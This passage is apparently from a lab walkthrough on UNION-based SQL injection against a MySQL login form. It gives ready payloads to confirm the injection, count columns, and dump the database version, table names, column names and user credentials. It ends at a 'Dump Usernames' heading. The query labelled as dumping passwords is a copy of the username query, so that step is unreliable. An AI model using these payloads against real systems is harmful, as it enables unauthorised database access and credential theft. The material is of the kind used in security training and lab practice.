We can check if **SQLI** is possible by using this query -  `admin' OR 1=1#` or `admin' OR 1=1-- -` and here is the output

Since we don't know how many **columns** exists on this table we could use the `UNION` query to query for information we need

```
admin' union select null,null,null#
```

**_Where :_**

>`admin` is likely an attempt to target a user or role named "admin" in the database.
  `union` is used to combine the result of the injected query with the original query.
  `select null, null, null` is an attempt to retrieve three columns of data. The null values here may be placeholders, and an attacker would typically replace them with actual data or malicious code.
 `#` is used to comment out the rest of the query, effectively ignoring any text that follows it.


#### **Example**

If we get a **No users found** related message then you should keep adding the `null,` statement, till we have something positive as shown above

### **Dumping MYSQL Version**

```
admin' union select null,null,version()#
```

we can just replace the third null with `version()` and should give us the version of MYSQL

### **Dumping Table Names**

```
admin' union select null,null,table_name from information_schema.tables#
```

### **Dumping Columns Names**

```
admin' union select null,null,column_name from information_schema.columns#
```

### **Data Exfiltration**

```
# dump usernames
admin' union select null,null,username from injection0x01#

# dump passwords
admin' union select null,null,username from injection0x01#
```

Since we know the column and tables, we can now dump out a particular column from a table with the above query



**_Dump Usernames :_**
